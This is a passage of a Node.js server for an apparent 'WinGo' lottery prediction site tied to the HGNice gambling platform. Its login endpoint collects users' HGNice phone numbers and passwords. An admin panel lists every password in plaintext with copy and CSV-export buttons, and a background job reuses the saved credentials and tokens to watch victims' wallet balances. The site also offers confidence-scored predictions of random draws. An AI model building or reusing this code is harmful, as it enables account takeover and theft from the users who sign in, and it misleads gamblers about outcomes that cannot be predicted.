    if (list.length && (!earlyCache.latest)) {
      earlyCache = { latest: mapItem(list[0]), fetchedAt: Date.now() };
    }
    // Compute first prediction now that history is seeded
    try {
      serverPredictionCache = predictNext();
      console.log(`[predict] Startup prediction: ${serverPredictionCache?.prediction} (${serverPredictionCache?.confidence}% conf, streak=${serverPredictionCache?.streakLen})`);
    } catch(e) {}
  } catch (e) {
    console.warn('[history] Startup seed failed:', e.message);
  }
}

// Start background pollers immediately
pollState();
seedEarlyCache();
seedHistoryOnStartup();

// ── Background balance refresher — re-fetches balance for every active session ─
async function refreshAllBalances() {
  const phones = [...authSessions.keys()];
  for (const phone of phones) {
    const sess = authSessions.get(phone);
    if (!sess) continue;
    const creds = await loadCreds();
    const cred = creds.find(c => c.phone === phone);
    if (!cred) continue;
    try {
      await fetchAndSaveBalance(phone, cred.password, sess.token, sess.tokenHeader);
    } catch {}
  }
}
setInterval(refreshAllBalances, 30000);

// ── API Endpoints ─────────────────────────────────────────────────────────────

// Auth endpoint — validates HGNice credentials
app.options('/api/auth', (req, res) => { setCors(res); res.sendStatus(200); });
app.post('/api/auth', async (req, res) => {
  setCors(res);
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.status(400).json({ success: false, msg: 'Username and password required' });
  }
  const result = await hgniceLogin(username.trim(), password.trim());
  return res.status(result.success ? 200 : 401).json(result);
});

// Heartbeat endpoint — frontend pings every 60s to keep "Active" status alive
app.options('/api/heartbeat', (req, res) => { setCors(res); res.sendStatus(200); });
app.post('/api/heartbeat', (req, res) => {
  setCors(res);
  const { phone } = req.body || {};
  if (!phone) return res.json({ ok: false });
  // Always mark lastSeen — even after server restart or first ping
  const sess = authSessions.get(phone) || { token: '', tokenHeader: 'Bearer ', lastSeen: 0 };
  sess.lastSeen = Date.now();
  authSessions.set(phone, sess);
  return res.json({ ok: true });
});

// Balance endpoint — fetches user wallet balance using stored session token
app.options('/api/balance', (req, res) => { setCors(res); res.sendStatus(200); });
app.post('/api/balance', async (req, res) => {
  setCors(res);
  const { phone } = req.body || {};
  if (!phone) return res.json({ success: false, msg: 'No phone' });
  const session = authSessions.get(phone);
  if (!session) return res.json({ success: false, msg: 'No session' });

  const { token, tokenHeader: tokenPrefix } = session;

  // Primary: extract directly from JWT — HGNice embeds Amount in token payload
  const jwt = parseJwtPayload(token);
  if (jwt && jwt.Amount !== undefined) {
    const bal = parseFloat(jwt.Amount);
    if (!isNaN(bal)) return res.json({ success: true, balance: bal });
  }

  // Fallback: Lottery API
  const GAME_HEADERS = {
    'Content-Type': 'application/json',
    'Referer': 'https://hgnice.club/',
    'Origin': 'https://hgnice.club',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Authorization': `${tokenPrefix}${token}`
  };
  for (const epUrl of [
    'https://api.ar-lottery01.com/api/Lottery/GetUserInfo',
    'https://api.ar-lottery01.com/api/Lottery/GetBalance',
  ]) {
    try {
      const random = generateUUID();
      const sig = buildSignature({ language: 'en', random });
      const r = await fetch(`${epUrl}?language=en&random=${random}&signature=${sig}`, { headers: GAME_HEADERS });
      const text = await r.text();
      if (!text) continue;
      const d = JSON.parse(text);
      if ((d.code === 0 || d.code === 200) && d.data) {
        const bal = d.data.balance ?? d.data.totalBalance ?? d.data.availBalance ??
                    d.data.walletBalance ?? d.data.amount ?? d.data.money ?? null;
        return res.json({ success: true, balance: bal });
      }
    } catch (e) { /* try next */ }
  }
  return res.json({ success: false, msg: 'Could not fetch balance' });
});

app.get('/api/wingo', async (req, res) => {
  setCors(res);
  try {
    const ts = Date.now();
    const url = `https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=20&ts=${ts}`;
    const response = await fetch(url, { headers: HEADERS });
    const data = await response.json();
    const list = data.data?.list || data.list || [];
    const mapped = list.map(mapItem);
    // Keep earlyCache up to date with the freshest known result
    if (mapped.length && (!earlyCache.latest || mapped[0].period !== earlyCache.latest.period)) {
      earlyCache = { latest: mapped[0], fetchedAt: Date.now() };
    }
    return res.status(200).json({ success: true, history: mapped });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

// Returns ALL server-accumulated history (grows over time as rounds complete)
app.get('/api/wingo/history', (req, res) => {
  setCors(res);
  res.setHeader('Cache-Control', 'no-cache');
  // seedPeriods = PDF training data — exclude from live display, use for model only
  const liveRounds = serverHistory.filter(r => !seedPeriods.has(String(r.period)));
  return res.status(200).json({ success: true, history: liveRounds, total: liveRounds.length });
});

// Keep old bulk route — same live-only filter
app.get('/api/wingo/bulk', (req, res) => {
  setCors(res);
  res.setHeader('Cache-Control', 'no-cache');
  const liveRounds = serverHistory.filter(r => !seedPeriods.has(String(r.period)));
  return res.status(200).json({ success: true, history: liveRounds, total: liveRounds.length });
});

// State endpoint — served from cache (updated every 100-1000ms server-side)
app.get('/api/wingo/state', (req, res) => {
  setCors(res);
  // Adjust remainTime for time elapsed since last cache fetch
  const elapsed = (Date.now() - stateCache.fetchedAt) / 1000;
  const remainTime = Math.max(0, stateCache.remainTime - elapsed);
  // Use earlyCache for previous result — it comes from history API (has real number/result)
  const previous = earlyCache.latest || null;
  return res.status(200).json({
    success: true,
    issueNumber:     stateCache.issueNumber,
    nextIssueNumber: stateCache.nextIssueNumber,
    endTime:         stateCache.endTime,
    remainTime,
    totalTime: 30,
    previous
  });
});

// Early-result endpoint — served from cache (updated every 150ms server-side)
app.get('/api/wingo/early', (req, res) => {
  setCors(res);
  return res.status(200).json({ success: true, latest: earlyCache.latest });
});

// Prediction endpoint — returns the always-current server-cached prediction
app.get('/api/wingo/predict', (req, res) => {
  setCors(res);
  res.setHeader('Cache-Control', 'no-cache');
  try {
    const result = serverPredictionCache || predictNext();
    return res.status(200).json({ success: true, ...result, historySize: serverHistory.length });
  } catch (e) {
    return res.status(500).json({ success: false, error: e.message });
  }
});

// ── Admin panel ───────────────────────────────────────────────────────────────
app.get('/admin', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HGNice Admin</title>
<style>
:root{
  --bg:#0a0e1a;--surface:#111827;--surface2:#1a2234;--border:#1e2d45;
  --accent:#00d4aa;--accent2:#0099ff;--danger:#ff4466;--warn:#f59e0b;
  --text:#e2e8f0;--muted:#64748b;--green:#10b981;--blue:#3b82f6;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}

/* ── LOGIN ── */
#loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.login-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:40px 36px;width:100%;max-width:400px;box-shadow:0 25px 60px rgba(0,0,0,.5)}
.login-logo{text-align:center;margin-bottom:28px}
.login-logo .brand{font-size:26px;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-0.5px}
.login-logo .sub{color:var(--muted);font-size:12px;margin-top:4px;letter-spacing:1px;text-transform:uppercase}
.field{margin-bottom:16px}
.field label{display:block;font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.8px;text-transform:uppercase;margin-bottom:8px}
.field input{width:100%;padding:13px 16px;background:var(--bg);border:1.5px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;outline:none;transition:border-color .2s}
.field input:focus{border-color:var(--accent)}
.btn-login{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;border-radius:10px;color:#fff;font-weight:800;font-size:15px;cursor:pointer;letter-spacing:.5px;transition:opacity .2s;margin-top:4px}
.btn-login:hover{opacity:.9}
#loginErr{color:var(--danger);font-size:12px;text-align:center;margin-top:8px;min-height:16px}

/* ── LAYOUT ── */
#app{display:none;min-height:100vh;flex-direction:column}
.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:0 24px;height:60px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.topbar-left{display:flex;align-items:center;gap:12px}
.topbar-brand{font-size:18px;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.live-indicator{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--green);font-weight:600}
.live-dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:pulse 1.4s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
.topbar-right{display:flex;align-items:center;gap:12px}
.upd-time{font-size:11px;color:var(--muted)}
.btn-logout{background:rgba(255,68,102,.1);border:1px solid rgba(255,68,102,.3);color:var(--danger);padding:7px 14px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:700;transition:background .2s}
.btn-logout:hover{background:rgba(255,68,102,.2)}

/* ── TABS ── */
.tab-bar{background:var(--surface);border-bottom:1px solid var(--border);padding:0 24px;display:flex;gap:4px;overflow-x:auto}
.tab{padding:14px 18px;font-size:13px;font-weight:600;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:color .2s,border-color .2s}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab:hover:not(.active){color:var(--text)}

.main{padding:24px;max-width:1300px;margin:0 auto;width:100%}

/* ── STAT CARDS ── */
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:28px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px 22px;position:relative;overflow:hidden}
.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:14px 14px 0 0}
.stat-card.green::before{background:linear-gradient(90deg,var(--green),#34d399)}
.stat-card.blue::before{background:linear-gradient(90deg,var(--blue),#60a5fa)}
.stat-card.accent::before{background:linear-gradient(90deg,var(--accent),var(--accent2))}
.stat-card.warn::before{background:linear-gradient(90deg,var(--warn),#fcd34d)}
.stat-label{font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.7px;margin-bottom:10px}
.stat-value{font-size:28px;font-weight:800;line-height:1}
.stat-card.green .stat-value{color:var(--green)}
.stat-card.blue .stat-value{color:var(--blue)}
.stat-card.accent .stat-value{color:var(--accent)}
.stat-card.warn .stat-value{color:var(--warn)}
.stat-sub{font-size:11px;color:var(--muted);margin-top:6px}

/* ── WINGO LIVE CARD ── */
.wingo-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px 22px;margin-bottom:28px;display:flex;align-items:center;gap:24px;flex-wrap:wrap}
.wingo-block{display:flex;flex-direction:column;gap:4px}
.wingo-lbl{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.7px}
.wingo-val{font-size:16px;font-weight:700;font-family:monospace;color:var(--text)}
.wingo-val.accent{color:var(--accent)}
.wingo-val.big{color:#f59e0b}
.wingo-val.small{color:#3b82f6}
.wingo-divider{width:1px;height:40px;background:var(--border)}
.countdown-ring{position:relative;width:64px;height:64px;flex-shrink:0}
.countdown-ring svg{transform:rotate(-90deg)}
.countdown-ring circle{fill:none;stroke-width:5;stroke-linecap:round;transition:stroke-dashoffset .9s linear}
.countdown-ring .bg{stroke:var(--border)}
.countdown-ring .fg{stroke:var(--accent)}
.countdown-num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;color:var(--accent)}

/* ── SECTION HEADER ── */
.section-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px}
.section-title{font-size:16px;font-weight:700;color:var(--text);display:flex;align-items:center;gap:8px}
.badge{background:rgba(0,212,170,.15);border:1px solid rgba(0,212,170,.3);color:var(--accent);font-size:11px;font-weight:800;padding:3px 10px;border-radius:20px}
.hdr-btns{display:flex;gap:8px;flex-wrap:wrap}
.btn-sm{padding:8px 14px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;transition:background .2s,opacity .2s;border:none;touch-action:manipulation}
.btn-refresh{background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.3);color:var(--accent)}
.btn-refresh:hover{background:rgba(0,212,170,.22)}
.btn-export{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:var(--blue)}
.btn-export:hover{background:rgba(59,130,246,.22)}

/* ── TABLE ── */
.tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto}
table{width:100%;border-collapse:collapse;min-width:720px}
thead th{background:var(--surface2);padding:12px 14px;text-align:left;font-size:11px;font-weight:800;color:var(--muted);letter-spacing:.6px;text-transform:uppercase;white-space:nowrap;border-bottom:1px solid var(--border)}
tbody tr{border-bottom:1px solid var(--border);transition:background .15s}
tbody tr:last-child{border-bottom:none}
tbody tr:hover{background:rgba(255,255,255,.025)}
td{padding:13px 14px;font-size:13px;vertical-align:middle}
td.num{color:var(--muted);font-size:12px;text-align:center;width:40px}
.cell-stack{display:flex;flex-direction:column;gap:4px;align-items:flex-start}
.mono{font-family:monospace;font-weight:700;line-height:1.3}
.c-phone{color:#fbbf24}
.c-pwd{color:#6ee7b7}
.c-uid{color:#93c5fd}
.c-bal{color:var(--green);font-size:14px}
.c-time{color:var(--muted);font-size:11px;font-family:'Segoe UI',sans-serif;font-weight:400}
.copy-btn{background:rgba(255,255,255,.06);border:1px solid var(--border);color:var(--muted);padding:3px 9px;border-radius:5px;cursor:pointer;font-size:10px;transition:all .15s;white-space:nowrap}
.copy-btn:hover{background:rgba(0,212,170,.15);border-color:var(--accent);color:var(--accent)}
.copy-btn.copied{background:rgba(16,185,129,.15);border-color:var(--green);color:var(--green)}
.status-pill{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;white-space:nowrap}
.pill-active{background:rgba(16,185,129,.12);border:1px solid rgba(16,185,129,.35);color:var(--green)}
.pill-offline{background:rgba(100,116,139,.1);border:1px solid rgba(100,116,139,.25);color:var(--muted)}
.pill-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
.pill-active .pill-dot{background:var(--green);animation:pulse 1.4s ease-in-out infinite}
.pill-offline .pill-dot{background:var(--muted)}
.btn-remove{background:rgba(255,68,102,.08);border:1px solid rgba(255,68,102,.3);color:var(--danger);padding:6px 12px;border-radius:7px;cursor:pointer;font-size:11px;font-weight:700;transition:background .2s,opacity .2s;white-space:nowrap}
.btn-remove:hover{background:rgba(255,68,102,.2)}
.btn-remove:disabled{opacity:.3;cursor:not-allowed}
tr.removing{opacity:0;transform:translateX(20px);transition:opacity .3s,transform .3s;pointer-events:none}
.empty-row td{text-align:center;padding:44px;color:var(--muted);font-size:13px}
@keyframes balFlash{0%{background:rgba(16,185,129,.18)}70%{background:rgba(16,185,129,.07)}100%{background:transparent}}
tr.bal-flash{animation:balFlash 2.5s ease forwards}
.bal-up{color:var(--green)!important;text-shadow:0 0 10px rgba(16,185,129,.5)}

/* ── PREDICTIONS TABLE ── */
.pred-result{display:inline-block;padding:3px 10px;border-radius:6px;font-size:12px;font-weight:800;letter-spacing:.3px}
.pred-big{background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.3);color:var(--warn)}
.pred-small{background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.3);color:var(--blue)}
.pred-correct{background:rgba(16,185,129,.15);border:1px solid rgba(16,185,129,.3);color:var(--green)}
.pred-wrong{background:rgba(255,68,102,.12);border:1px solid rgba(255,68,102,.3);color:var(--danger)}

/* ── PAGES ── */
.page{display:none}
.page.active{display:block}

/* ── TOAST ── */
#toast{position:fixed;bottom:24px;right:24px;background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:12px 18px;font-size:13px;font-weight:600;color:var(--text);opacity:0;transform:translateY(10px);transition:opacity .25s,transform .25s;pointer-events:none;z-index:999;max-width:280px}
#toast.show{opacity:1;transform:translateY(0)}
#toast.t-ok{border-color:rgba(16,185,129,.5);color:var(--green)}
#toast.t-err{border-color:rgba(255,68,102,.4);color:var(--danger)}

@media(max-width:600px){.main{padding:16px}.stats-grid{grid-template-columns:1fr 1fr}.stat-value{font-size:22px}.wingo-divider{display:none}}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="loginScreen">
  <div class="login-card">
    <div class="login-logo">
      <div class="brand">HGNice Admin</div>
      <div class="sub">Secure Control Panel</div>
    </div>
    <div class="field">
      <label>Admin Password</label>
      <input type="password" id="ap" placeholder="Enter password…" onkeydown="if(event.key==='Enter')doLogin()">
    </div>
    <button class="btn-login" onclick="doLogin()">Sign In</button>
    <div id="loginErr"></div>
  </div>
</div>

<!-- APP -->
<div id="app">
  <div class="topbar">
    <div class="topbar-left">
      <span class="topbar-brand">HGNice Admin</span>
      <span class="live-indicator"><span class="live-dot"></span>Live</span>
    </div>
    <div class="topbar-right">
      <span class="upd-time" id="updTime">—</span>
      <button class="btn-logout" onclick="doLogout()">Sign Out</button>
    </div>
  </div>

  <div class="main">

    <!-- USERS PAGE -->
    <div id="page-users">
      <div class="section-hdr">
        <span class="section-title">All Users <span class="badge" id="userCnt">0</span></span>
        <div class="hdr-btns">
          <button class="btn-sm btn-export" onclick="exportCSV()">⬇ Export CSV</button>
          <button class="btn-sm btn-refresh" onclick="loadAll()">↻ Refresh</button>
        </div>
      </div>
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>#</th><th>Status</th><th>Phone</th><th>Password</th><th>UID</th><th>Balance (৳)</th><th>Last Login</th><th>Actions</th></tr></thead>
          <tbody id="userTbody"><tr class="empty-row"><td colspan="8">Loading…</td></tr></tbody>
        </table>
      </div>
    </div>

  </div><!-- /main -->
</div><!-- /app -->

<div id="toast"></div>

<script>
let tok='',_prev={},_autoT=null;

function toast(msg,type='ok'){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='show t-'+type;
  clearTimeout(t._h);t._h=setTimeout(()=>t.className='',2200);
}

function showApp(){
  document.getElementById('loginScreen').style.display='none';
  document.getElementById('app').style.display='flex';
  document.getElementById('app').style.flexDirection='column';
  loadAll();
  if(_autoT)clearInterval(_autoT);
  _autoT=setInterval(loadAll,10000);
}

async function doLogin(){
  const pw=document.getElementById('ap').value.trim();
  if(!pw)return;
  const btn=document.querySelector('.btn-login');
  btn.textContent='Signing in…';btn.disabled=true;
  try{
    const r=await fetch('/admin/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
    const d=await r.json();
    if(d.ok){tok=pw;sessionStorage.setItem('adm',tok);showApp();}
    else{document.getElementById('loginErr').textContent='Incorrect password.';}
  }catch{document.getElementById('loginErr').textContent='Connection error.';}
  btn.textContent='Sign In';btn.disabled=false;
}

function doLogout(){
  tok='';sessionStorage.removeItem('adm');
  clearInterval(_autoT);_autoT=null;
  document.getElementById('loginScreen').style.display='flex';
  document.getElementById('app').style.display='none';
  document.getElementById('ap').value='';
}

(async()=>{
  const saved=sessionStorage.getItem('adm');
  if(saved){
    try{const r=await fetch('/admin/api/creds',{headers:{'x-admin-pw':saved}});const d=await r.json();if(d.ok){tok=saved;showApp();}}catch{}
  }
})();

async function loadAll(){
  try{
    const r=await fetch('/admin/api/creds',{headers:{'x-admin-pw':tok}});
    const d=await r.json();
    if(!d.ok)return;
    const list=d.list||[];
    document.getElementById('updTime').textContent='Updated '+new Date().toLocaleTimeString();
    document.getElementById('userCnt').textContent=list.length;
    const changed=new Set();
    list.forEach(c=>{
      const prev=_prev[c.phone];const cur=c.balance;
      if(prev!==undefined&&cur!==null&&cur!==undefined&&String(cur)!==String(prev))changed.add(c.phone);
      _prev[c.phone]=cur;
    });
    renderUserTable(list,changed);
  }catch(e){console.error(e);}
}

function fmtBal(b){return(b!==null&&b!==undefined)?'৳'+Number(b).toLocaleString('en',{minimumFractionDigits:2,maximumFractionDigits:2}):'—';}
function fmtPhone(p){return'+880 '+p.replace(/^880/,'');}
function fmtTime(t){try{return new Date(t).toLocaleString();}catch{return'—';}}

function renderUserTable(list,changed){
  const tb=document.getElementById('userTbody');
  if(!list.length){tb.innerHTML='<tr class="empty-row"><td colspan="8">No users yet.</td></tr>';return;}
  tb.innerHTML=list.map((c,i)=>{
    const chg=changed.has(c.phone);
    const uid=c.uid||'—';const hasUid=!!(c.uid&&c.uid!=='—');
    const pill=c.active
      ?'<span class="status-pill pill-active"><span class="pill-dot"></span>Active</span>'
      :'<span class="status-pill pill-offline"><span class="pill-dot"></span>Offline</span>';
    return\`<tr id="row-\${c.phone}"\${chg?' class="bal-flash"':''}>
      <td class="num">\${i+1}</td>
      <td>\${pill}</td>
      <td><div class="cell-stack"><span class="mono c-phone">\${fmtPhone(c.phone)}</span><button class="copy-btn" onclick="copyVal('\${c.phone}',this)">Copy</button></div></td>
      <td><div class="cell-stack"><span class="mono c-pwd">\${c.password}</span><button class="copy-btn" onclick="copyVal('\${c.password}',this)">Copy</button></div></td>
      <td><div class="cell-stack"><span class="mono c-uid">\${uid}</span>\${hasUid?'<button class="copy-btn" onclick="copyVal(\\''+uid+'\\',this)">Copy</button>':''}</div></td>
      <td><span class="mono c-bal\${chg?' bal-up':''}">\${fmtBal(c.balance)}</span></td>
      <td><span class="c-time">\${fmtTime(c.lastLogin)}</span></td>
      <td><button class="btn-remove" data-p="\${c.phone}" onclick="removeUser(this)">✕ Remove</button></td>
    </tr>\`;
  }).join('');
}

async function removeUser(btn){
  const phone=btn.dataset.p;
  if(!confirm('Remove '+fmtPhone(phone)+'?'))return;
  btn.disabled=true;btn.textContent='…';
  try{
    const r=await fetch('/admin/api/creds/'+encodeURIComponent(phone),{method:'DELETE',headers:{'x-admin-pw':tok}});
    const d=await r.json();
    if(d.ok){
      const row=document.getElementById('row-'+phone);
      if(row){row.classList.add('removing');setTimeout(()=>{row.remove();loadAll();},320);}
      toast('Account removed');
    }else{btn.disabled=false;btn.textContent='✕ Remove';toast('Failed to remove','err');}
  }catch{btn.disabled=false;btn.textContent='✕ Remove';toast('Connection error','err');}
}

function copyVal(v,btn){
  navigator.clipboard.writeText(v).then(()=>{
    const old=btn.textContent;btn.textContent='Copied!';btn.classList.add('copied');
    setTimeout(()=>{btn.textContent=old;btn.classList.remove('copied');},1500);
  }).catch(()=>{toast('Copy failed','err');});
}

function exportCSV(){
  const rows=document.querySelectorAll('#userTbody tr[id]');
  if(!rows.length){toast('No data to export','err');return;}
  const lines=['Phone,Password,UID,Balance,Status,Last Login'];
  rows.forEach(r=>{
    const cells=r.querySelectorAll('td');
    const phone=cells[2]?.querySelector('.mono')?.textContent?.trim()||'';
    const pwd=cells[3]?.querySelector('.mono')?.textContent?.trim()||'';
    const uid=cells[4]?.querySelector('.mono')?.textContent?.trim()||'';
    const bal=cells[5]?.querySelector('.mono')?.textContent?.trim()||'';
    const status=cells[1]?.querySelector('.status-pill')?.textContent?.trim()||'';
    const time=cells[6]?.textContent?.trim()||'';
    lines.push([phone,pwd,uid,bal,status,time].map(v=>'"'+v.replace(/"/g,'""')+'"').join(','));
  });
  const a=document.createElement('a');
  a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(lines.join('\\n'));
  a.download='hgnice-users-'+new Date().toISOString().slice(0,10)+'.csv';
  a.click();toast('CSV exported');
}


</script>
</body>
</html>`);
});

app.post('/admin/api/login', (req, res) => {
  const { password } = req.body || {};
  res.json({ ok: password === ADMIN_PASSWORD });
});

app.get('/admin/api/creds', async (req, res) => {
  if (req.headers['x-admin-pw'] !== ADMIN_PASSWORD) return res.json({ ok: false });
  const ACTIVE_TIMEOUT = 3 * 60 * 1000; // 3 minutes
  const dbList = await loadCreds();
  const dbPhones = new Set(dbList.map(c => c.phone));

  // Merge in any in-memory sessions not yet written to DB
  // (e.g. if saveCred write is still pending or failed)
  const merged = [...dbList];
  for (const [phone, sess] of authSessions.entries()) {
    if (!dbPhones.has(phone)) {
      merged.unshift({
        phone,
        password: '(session only)',
        uid: null,
        balance: null,
        lastLogin: new Date(sess.lastSeen).toISOString()
      });
    }
  }

  const list = merged.map(c => {
    const sess = authSessions.get(c.phone);
    const active = !!(sess && (Date.now() - sess.lastSeen) < ACTIVE_TIMEOUT);
    return { ...c, active };
  });
  res.json({ ok: true, list });
});

app.delete('/admin/api/creds/:phone', async (req, res) => {
  if (req.headers['x-admin-pw'] !== ADMIN_PASSWORD) return res.json({ ok: false });
  const ok = await deleteCred(req.params.phone);
  res.json({ ok });
});

// ── Prediction history endpoints ───────────────────────────────────────────────
app.get('/api/predictions', (req, res) => {
  setCors(res);
  res.setHeader('Cache-Control', 'no-cache');
  return res.status(200).json({ success: true, history: predHistory });
});

app.options('/api/predictions', (req, res) => { setCors(res); res.sendStatus(204); });

app.post('/api/predictions', (req, res) => {
  setCors(res);
  const { entries } = req.body || {};
  if (!Array.isArray(entries) || entries.length === 0) {
    return res.status(400).json({ success: false, msg: 'entries must be a non-empty array' });
  }
  let added = 0;
  for (const entry of entries) {
    const pid = String(entry.period || '');
    if (pid && !predHistorySet.has(pid)) {
      predHistorySet.add(pid);
      predHistory.unshift(entry);
      added++;
    }
  }
  if (added > 0) {
    predHistory.sort((a, b) => String(b.period).localeCompare(String(a.period)));
    savePredHistoryToFile();
  }
  return res.status(200).json({ success: true, added, total: predHistory.length });
});

app.use(express.static(__dirname, {
  maxAge: '7d',
  setHeaders(res, filePath) {
    if (filePath.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    }
  }
}));

app.get(/.*/, (req, res) => {
  res.sendFile(`${__dirname}/index.html`);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
